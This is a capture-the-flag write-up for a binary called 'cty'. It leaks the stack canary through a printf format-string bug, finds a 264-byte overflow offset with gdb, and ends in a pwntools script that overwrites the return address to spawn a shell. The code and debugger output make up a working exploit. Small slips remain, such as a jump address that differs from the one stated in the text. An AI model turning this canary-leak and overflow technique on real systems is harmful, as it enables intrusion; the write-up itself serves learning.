# Problem:
namp scan get the following:   
```
2500/tcp open     rtsserv?
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions, NULL: 
|_    Warning: this server only sends one line at a time. If you've opened a shell, this may lead to some weird shenanigans until you are able to get a proper shell with netcat.Welcome to the C-Ty! You notice a canary watching over these parts. But can you get past it with the right set of words? Input encoded in hex:
```   
Attached are two files: cty.c and cty (binary)

## Classic BOF with Canary problem
### Run the cty binary:   
```
kali@kali:~/ct-y$ ./cty
AAAAAAAAAAAAAAAAa
AAAAAAAAAAAAAAAAa
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
```    
### Analysis

The code is a simple c code:
``` 
#include <stdio.h>
#include <unistd.h>
#include <string.h>
 
void dumpFlag() {
    puts("The blue key to The Gate is '[key removed]'");
}
 
void runIntoTheCty() {
    puts("Running into the C-Ty...");
    char* args[] = {"/bin/sh", NULL};
    execv("/bin/sh", args);
}
 
int main() {
    char input[256];
    gets(input);
    printf(input);
    puts("");
    gets(input);
    printf(input);
    puts("");
}                      
```    
With pwn we can check the binary **cty**: it is a 64 bit ELF. As you can see, Canary protection is active.    
```
kali@kali:~/ct-y$ pwn checksec cty                                                                                
[*] '/home/kali/ct-y/cty'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
With GDB we can see in the main function, the canary is checked:    
```
   0x0000000000401256 <+125>:   call   0x401030 <puts@plt>
   0x000000000040125b <+130>:   mov    eax,0x0
   0x0000000000401260 <+135>:   mov    rdx,QWORD PTR [rbp-0x8]
   0x0000000000401264 <+139>:   sub    rdx,QWORD PTR fs:0x28     //check canary. RDX is the register
   0x000000000040126d <+148>:   je     0x401274 <main+155>
   0x000000000040126f <+150>:   call   0x401040 <__stack_chk_fail@plt>

   ``` 
As soon as we see the c code, we see a format string in **printf()**, and an overflow buffer in **gets()**.    
### Leak the Canary
We do a python code to see possible outputs of **format strings**      
**%dlx** is used to print out address value

(This article explains well about what is <a href="https://www.win.tue.nl/~aeb/linux/hh/hh-5.html#ss5.5">format strings attack</a> )
```
#!/usr/bin/env python3
from pwn import *

io = ELF("./cty")
for i in range(50):
  p = io.process(level="error")
  p.sendline("33")
  p.sendline("AAAA %%%d$lx" % i)
  p.recvline()
  print("%d - %s" % (i, p.recvline().strip()))
  p.close()
```
Output is:
```
kali@kali:~/ct-y$ python3 t1.py
[*] '/home/kali/ct-y/cty'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
0 - b'AAAA %0$lx'
1 - b'AAAA 6c24312520414141'
2 - b'AAAA 0'
3 - b'AAAA 7fee9f427980'
4 - b'AAAA 7fff84aba680'
5 - b'AAAA 0'
6 - b'AAAA 2436252041414141'
7 - b'AAAA 7f68d200786c'
8 - b'AAAA 0'
9 - b'AAAA 7ffe058d6790'
10 - b'AAAA 7f866c983730'
11 - b'AAAA 7fe96a5b4ac0'
12 - b'AAAA 0'
13 - b'AAAA 0'
14 - b'AAAA 0'
15 - b'AAAA 0'
16 - b'AAAA ffffffff'
17 - b'AAAA 0'
18 - b'AAAA 7ffc83d342a8'
19 - b'AAAA 7f1aa9e29730'
20 - b'AAAA 0'
21 - b'AAAA 0'
22 - b'AAAA 0'
23 - b'AAAA 0'
24 - b'AAAA 0'
25 - b'AAAA 0'
26 - b'AAAA 0'
27 - b'AAAA f0b5ff'
28 - b'AAAA c2'
29 - b'AAAA 7ffefe41cea7'
30 - b'AAAA 7ffd535a3946'
31 - b'AAAA 7f1a482769f5'
32 - b'AAAA 0'
33 - b'AAAA 4012cd'
34 - b'AAAA 0'
35 - b'AAAA 0'
36 - b'AAAA 401280'
37 - b'AAAA 401080'
38 - b'AAAA 7ffc4da218f0'
39 - b'AAAA 369bda5ddbf1bc00'
40 - b'AAAA 401280'
41 - b'AAAA 7fecf9ae4e0b'
42 - b'AAAA 0'
43 - b'AAAA 7ffe78103658'
44 - b'AAAA 100040000'
45 - b'AAAA 4011d9'
46 - b'AAAA 0'
47 - b'AAAA d2d22253bdd7b319'
48 - b'AAAA 401080'
49 - b'AAAA 7ffe0446bea0'
```
Out starting with **0x7f** correspond to libc memory addresses. Canary usually ends with **00**.
In 39th, we see one canary possible address.   
To calculate if the canary corresponds with output 39 of **format string**, we use gdb again:

```
kali@kali:~/ct-y$ gdb cty
GNU gdb (Debian 9.2-1) 9.2
gef➤  disass main
Dump of assembler code for function main:
0x00000000004011d9 <+0>:     push   rbp
.....
0x0000000000401260 <+135>:   mov    rdx,QWORD PTR [rbp-0x8]
0x0000000000401264 <+139>:   sub    rdx,QWORD PTR fs:0x28
0x000000000040126d <+148>:   je     0x401274 <main+155>
0x000000000040126f <+150>:   call   0x401040 <__stack_chk_fail@plt>
...
End of assembler dump.
gef➤  b *main+139
Breakpoint 1 at 0x401264
gef➤  r
Starting program: /home/kali/ct-y/cty 
%39$lx
d2f524612effb00     //Canary value at 39th
A
A
Breakpoint 1, 0x0000000000401264 in main ()
.....
gef➤  p $rdx
$2 = 0xd2f524612effb00  //Canary value at the rdx. They match
````
Perfect, we get the location at 39.

### Padding
Now we calculate the padding we use to overwrite the canary and then the return address.  
Breakpoint set at the canary check point again: *main+139
```
gef➤  pattern create 300
[+] Generating a pattern of 300 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
gef➤  r
Starting program: /home/kali/ct-y/cty 
a
a
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa

Breakpoint 1, 0x0000000000401264 in main ()
gef➤  p/x $rdx               //rdx overload with created pattern, use that to find the offset
$3 = 0x6261616161616169
gef➤  pattern offset 0x6261616161616169
[+] Searching '0x6261616161616169'
[+] Found at offset 264 (little-endian search) likely
```
We found the offset to **canary** likely to be **264**. So we create the payload to be like this:
```
"A"*264+CANARY+"A"*8+ ROP
```
**ROP** is the function jump address. In this case, would be the address of **void runIntoTheCty()**.
We can find it using GDB. The address is **0x40117d**
```
gef➤  b runIntoTheCty
Breakpoint 2 at 0x40117d
```
Thus we craft the python program like this:
```
#!/usr/bin/evn python3
from pwn import *

e = ELF('./cty')
io = e.process()
gdb.attach(io)
io.sendline('%39$lx')
leak = io.recvline()
canary = int(leak.strip(),16)
log.info("Canary: %s" % (hex(canary)))

run = 0x401179
pl = b'A'*8
payload = b'A'*264 + p64(canary) + pl + p64(run)
io.sendline(payload)
io.interactive()
```




